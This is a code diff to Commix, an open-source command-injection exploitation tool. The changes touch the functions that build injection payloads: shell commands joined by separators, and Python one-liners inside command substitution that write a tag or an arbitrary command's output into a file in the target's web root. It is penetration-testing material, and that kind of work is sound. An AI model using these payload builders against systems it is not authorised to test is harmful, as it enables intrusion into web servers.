@@ -3,7 +3,7 @@
 
 """
 This file is part of Commix Project (https://commixproject.com).
-Copyright (c) 2014-2024 Anastasios Stasinopoulos (@ancst).
+Copyright (c) 2014-2025 Anastasios Stasinopoulos (@ancst).
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
@@ -35,8 +35,7 @@ def decision(separator, TAG, OUTPUT_TEXTFILE):
               )
   else:
     payload = (separator +
-              "echo " + TAG + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE +
-              separator
+              "echo " + TAG + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE
               )
 
   return payload
@@ -45,7 +44,6 @@ def decision(separator, TAG, OUTPUT_TEXTFILE):
 __Warning__: The alternative shells are still experimental.
 """
 def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
-
   if settings.TARGET_OS == settings.OS.WINDOWS:
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"open('" + OUTPUT_TEXTFILE + "','w').write('" + TAG + "')\""
     payload = (separator +
@@ -55,7 +53,7 @@ def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
               )
   else:
     payload = (separator +
-              "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"f=open('" + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\nf.write('" + TAG + "')\nf.close()\n\")"
+              settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f=open('" + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\nf.write('" + TAG + "')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX
                )
 
   if settings.USER_AGENT_INJECTION == True or \
@@ -85,10 +83,9 @@ def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
               "\"') do @set /p = %i " + settings.CMD_NUL
               )
   else:
-    settings.USER_SUPPLIED_CMD = cmd
+    settings.USER_APPLIED_CMD = cmd
     payload = (separator +
-              cmd + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE +
-              separator
+              cmd + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE
               )
 
   return payload
@@ -110,7 +107,8 @@ def cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE):
                 )
   else:
     payload = (separator +
-              "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"f=open('" + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")"
+              settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f=open('" + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\nf.write('" + 
+              settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX + settings.CMD_SUB_SUFFIX + "')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX
               )
 
   # New line fixation
